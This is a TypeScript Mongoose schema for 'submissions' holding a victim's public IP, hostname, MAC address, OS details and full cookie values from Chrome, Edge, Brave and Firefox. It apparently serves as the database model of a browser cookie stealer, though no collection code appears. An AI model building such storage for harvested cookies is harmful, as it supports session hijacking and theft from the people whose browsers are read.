import mongoose, { Schema, Document, Model } from 'mongoose';

interface Cookie {
  name: string;
  value: string;
  domain: string;
  path: string;
  expires?: string;
  secure?: boolean;
  http_only?: boolean;
}

interface BrowserCookies {
  chrome?: Cookie[];
  edge?: Cookie[];
  brave?: Cookie[];
  firefox?: Cookie[];
}

interface DeviceInfo {
  os_system?: string;
  os_release?: string;
  os_version?: string;
  architecture?: string;
  hostname?: string;
  mac_address?: string;
  processor?: string;
}

export interface ISubmission extends Document {
  timestamp: string;
  public_ip: string;
  device_info: DeviceInfo;
  cookies: BrowserCookies;
  createdAt: Date;
}

const CookieSchema = new Schema({
  name: String,
  value: String,
  domain: String,
  path: String,
  expires: String,
  secure: Boolean,
  http_only: Boolean,
}, { _id: false });

const BrowserCookiesSchema = new Schema({
  chrome: [CookieSchema],
  edge: [CookieSchema],
  brave: [CookieSchema],
  firefox: [CookieSchema],
}, { _id: false });

const DeviceInfoSchema = new Schema({
  os_system: String,
  os_release: String,
  os_version: String,
  architecture: String,
  hostname: String,
  mac_address: String,
  processor: String,
}, { _id: false });

const SubmissionSchema: Schema<ISubmission> = new Schema({
  timestamp: {
    type: String,
    required: true,
  },
  public_ip: {
    type: String,
    required: true,
  },
  device_info: {
    type: DeviceInfoSchema,
    required: true,
  },
  cookies: {
    type: BrowserCookiesSchema,
    required: true,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

const Submission: Model<ISubmission> = 
  mongoose.models.Submission || mongoose.model<ISubmission>('Submission', SubmissionSchema);

export default Submission;
